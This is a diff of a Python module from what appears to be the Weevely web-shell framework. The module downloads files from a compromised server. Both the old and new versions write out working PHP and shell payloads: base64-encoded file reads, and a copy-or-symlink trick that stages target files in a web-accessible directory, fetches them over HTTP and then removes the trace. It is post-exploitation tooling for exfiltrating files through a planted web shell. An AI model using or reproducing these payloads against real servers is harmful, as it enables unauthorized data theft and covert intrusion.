@@ -3,196 +3,123 @@ Created on 24/ago/2011
 
 @author: norby
 '''
-from core.module import Module, ModuleException
+from core.moduleprobeall import ModuleProbeAll
+from core.moduleexception import  ModuleException, ExecutionException, ProbeException, ProbeSucceed
 from core.http.request import Request
 from base64 import b64decode
 from hashlib import md5
-from random import randint
-from core.vector import VectorList, Vector as V
-from core.parameters import ParametersList, Parameter as P
+from core.savedargparse import SavedArgumentParser as ArgumentParser
+from core.utils import randstr
+import os
 
-classname = 'Download'
+WARN_NO_SUCH_FILE = 'No such file or permission denied'
 
-class Download(Module):
-    '''Download binary/ascii files from target filesystem
-    :file.download <remote path> <locale path>
-    '''
+class Download(ModuleProbeAll):
+    '''Download binary/ascii files from target filesystem'''
 
-    vectors = VectorList([
-        V('shell.php', 'file', "print(@base64_encode(implode('', file('%s'))));"),
-        V('shell.php', 'fread', "$f='%s'; print(@base64_encode(fread(fopen($f,'rb'),filesize($f))));"),
-        V('shell.php', "file_get_contents", "print(@base64_encode(file_get_contents('%s')));"),
-        V('shell.sh',  "base64", "base64 -w 0 %s"),
-        V('shell.php', "copy", "copy('compress.zlib://%s','%s') && print(1);"),
-        V('shell.php',  "symlink", "symlink('%s','%s') && print(1);")
+    def _set_vectors(self):
 
-    ])
-
-
-
-
-    params = ParametersList('Download binary/ascii files from target', vectors,
-                    P(arg='rpath', help='Remote file path', required=True, pos=0),
-                    P(arg='lpath', help='Local file path', required=True, pos=1)
-                    )
-
-
-    def __init__(self, modhandler, url, password):
-
-        self.encoder_callable = False
-        self.md5_callable = False
-
-
-        self.payload = None
-        self.vector = None
-        self.interpreter = None
+        self.vectors.add_vector('file', 'shell.php', "print(@base64_encode(implode('', file('$rpath'))));")
+        self.vectors.add_vector('fread', 'shell.php', "$f='$rpath'; print(@base64_encode(fread(fopen($f,'rb'),filesize($f))));")
+        self.vectors.add_vector("file_get_contents",'shell.php', "print(@base64_encode(file_get_contents('$rpath')));")
+        self.vectors.add_vector("base64",'shell.sh',  "base64 -w 0 $rpath")
+        self.vectors.add_vector("copy",'shell.php', "(copy('compress.zlib://$rpath','$downloadpath') && print(1)) || print(0);")
+        self.vectors.add_vector("symlink", 'shell.php', "(symlink('$rpath','$downloadpath') && print(1)) || print(0);")
+    
+        self.support_vectors.add_vector("check_readable", 'file.check', "$rpath read".split(' '))
+        self.support_vectors.add_vector('upload2web', 'file.upload2web', '$rand -content 1'.split(' '))
+        self.support_vectors.add_vector('remove', 'file.rm', '$rpath')
+        self.support_vectors.add_vector('md5', 'file.check', '$rpath md5'.split(' '))
+    
+    def _set_args(self):
+        self.argparser.add_argument('rpath')
+        self.argparser.add_argument('lpath')
+        self.argparser.add_argument('-vector', choices = self.vectors.keys())
+        
+    def _prepare_probe(self):
         self.transfer_dir = None
-        self.transfer_url_dir = None
-
         self.lastreadfile = ''
 
+    def _prepare_vector(self):
+        
+        remote_path = self.args['rpath']
+        self.args_formats['rpath'] = self.args['rpath']
+        
+        # First check remote file existance
+        
+        if not self.support_vectors.get('check_readable').execute({'rpath' : remote_path}):
+            raise ProbeException(self.name, '\'%s\' %s' % (remote_path, WARN_NO_SUCH_FILE))
+         
+        # Vectory copy and symlink needs to search a writable directory before
+        
+        if self.current_vector.name in ( 'copy', 'symlink' ):
 
-        Module.__init__(self, modhandler, url, password)
+                filename_temp = randstr() + remote_path.split('/').pop();
+                upload_test = self.support_vectors.get('upload2web').execute({ 'rand' : filename_temp})
 
+                if not upload_test:
+                    raise ExecutionException(self.current_vector.name,'No transfer url dir found')
 
-    def _probe(self):
+                self.args_formats['downloadpath'] = upload_test[0]
+                self.args['url'] = upload_test[1]
 
-        if self.modhandler.load('shell.php').run({ 0 : "is_callable('base64_encode') && print('1');" }) == '1':
-            self.encoder_callable = True
+                self.support_vectors.get('remove').execute({ 'path' : self.args_formats['downloadpath'] })
+
+            
+
+    def _execute_vector(self):
+        
+        output = self.current_vector.execute( self.args_formats)
+        
+        if self.current_vector.name in ('copy', 'symlink'):
+
+            if self.support_vectors.get('check_readable').execute({'rpath' : self.args_formats['downloadpath']}):
+                self._result = Request(self.args['url']).read()
+                # Force deleting. Does not check existance, because broken links returns False
+            
+            self.support_vectors.get('remove').execute({'rpath' : self.args_formats['downloadpath']})
+            
         else:
-            self.mprint('[%s] PHP \'base64_encode\' transfer methods not available.' % self.name)
-
-
-    def __prepare_payload( self, vector, parameters ):
-
-        if vector.payloads[0].count( '%s' ) == len(parameters):
-            return vector.payloads[0] % tuple(parameters)
-        else:
-            raise ModuleException(self.name,  "Error payload parameter number does not corresponds")
-
-
-    def __execute_payload(self, vector, parameters):
-
-        remote_path = parameters[0]
-
-        if (vector.name == 'copy' or vector.name == 'symlink'):
-
-            if not (self.transfer_dir and self.transfer_url_dir and self.file_path):
-
-                self.modhandler.set_verbosity(6)
-                if not self.modhandler.load('find.webdir').run({'rpath': 'find'}):
-                    self.modhandler.set_verbosity()
-                    return
-                self.modhandler.set_verbosity()
-
-                self.transfer_url_dir = self.modhandler.load('find.webdir').found_url
-                self.transfer_dir = self.modhandler.load('find.webdir').found_dir
-
-                if not self.transfer_url_dir or not self.transfer_dir:
-                    return
-
-                filename = '/' + str(randint(11, 999)) + remote_path.split('/').pop();
-                self.file_path = self.transfer_dir + filename
-                self.url = self.transfer_url_dir + filename
-
-            payload = self.__prepare_payload(vector, [remote_path, self.file_path])
-
-        else:
-
-            payload = self.__prepare_payload(vector, [remote_path])
-
-        response = self.modhandler.load(vector.interpreter).run({0 : payload})
-
-        if response:
-
-            self.payload = payload
-            self.interpreter = vector.interpreter
-            self.vector = vector
-
-            return response
-
-
-
-    def __process_response(self, response, remote_path, local_path):
-
-        if self.vector.name == 'copy' or self.vector.name == 'symlink':
-
-            if not self.file_path.endswith('.html') and not self.file_path.endswith('.htm'):
-                self.mprint("[%s] Warning: vector '%s' works better with files with downloadable extension like '.html'" % (self.name, self.vector.name))
-
-            if self.modhandler.load('file.check').run({'rpath' : self.file_path, 'mode': 'exists'}):
-                response = Request(self.url).read()
-            else:
-                response = None
-
-            # Force deleting. Does not check existance, because broken links returns False
-            self.modhandler.load('file.rm').run({'rpath' : self.file_path, 'recursive': False})
-
-        else:
-            if self.encoder_callable:
-                try:
-                    response = b64decode(response)
-                except TypeError:
-                    self.mprint("[!] [%s] Error, unexpected file content" % (self.name))
-
-
-        if response:
-
+            # All others encode data in b64 format
+            
             try:
-                f = open(local_path,'wb')
-                f.write(response)
-                f.close()
-            except Exception, e:
-                self.mprint('[!] [%s] Some error occurred writing local file \'%s\'.' % (self.name, local_path))
-                raise ModuleException(self.name, e)
+                self._result = b64decode(output)
+            except TypeError:
+                raise ExecutionException(self.current_vector.name,"Error, unexpected file content")
 
 
-            response_md5 = md5(response).hexdigest()
-            remote_md5 = self.modhandler.load('file.check').run({'rpath' : remote_path, 'mode' : 'md5'})
+    def _verify_execution(self):
 
-            if not remote_md5:
-                self.mprint('[!] [%s] MD5 hash method is not callable with \'%s\', check disabled' % (self.name, remote_path))
-                return response
-            elif not  remote_md5 == response_md5:
-                self.mprint('[%s] MD5 hash of \'%s\' file mismatch, file corrupted' % (self.name, local_path))
-            else:
-                self.mprint('[%s] File correctly downloaded to \'%s\'.' % (self.name, local_path))
-                return response
+        remote_path = self.args['rpath']
+        local_path = self.args['lpath']
 
-    def get_last_read_file(self):
-        """Get last read file and delete it"""
-        if self.lastreadfile:
-            lastreadfile = self.lastreadfile[:]
-            self.lastreadfile=''
-            return lastreadfile
+        try:
+            f = open(local_path,'wb')
+            f.write(self._result)
+            f.close()
+        except Exception, e:
+            raise ProbeException(self.name, 'Writing %s' % (e))
 
-    def run_module(self, remote_path, local_path):
+        response_md5 = md5(self._result).hexdigest()
+        remote_md5 = self.support_vectors.get('md5').execute({'rpath' : self.args_formats['rpath']})
 
-        vectors = self._get_default_vector2()
+        # Consider as probe failed only MD5 mismatch
+        if not remote_md5 == response_md5:
+            
+            if self.current_vector.name in ('copy', 'symlink') and not self.args_formats['downloadpath'].endswith('.html') and not self.args_formats['downloadpath'].endswith('.htm'):
+                self.mprint("Transferred with '%s', rename as downloadable type as '.html' and retry" % (self.args['url']))
 
-
-        file_response = None
-        if not vectors:
-            vectors  = self.vectors.get_vectors_by_interpreters(self.modhandler.loaded_shells)
-
-        for vector in vectors:
-
-            response = self.__execute_payload(vector, [remote_path, local_path])
-
-            if response != None:
-
-                file_response = self.__process_response(response, remote_path, local_path)
-
-                if file_response:
-                    self.params.set_and_check_parameters({'vector' : self.vector.name})
-                    self.lastreadfile = file_response
-                    return
-
-
-        if not file_response:
-            raise ModuleException(self.name,  "File read failed")
-
-
-
-
-
+            self.mprint('MD5 hash of \'%s\' file mismatch, file corrupt' % ( local_path))
+            raise ExecutionException(self.current_vector.name, 'file corrupt')
+        
+        elif not remote_md5:
+            self.mprint('MD5 check failed')
+        
+        raise ProbeSucceed(self.name, 'File downloaded to \'%s\'.' % (local_path))
+    
+    
+    
+    def _output_result(self):
+        # Not convert self._result to self._output (no output prints)
+        self._output = ''
+    
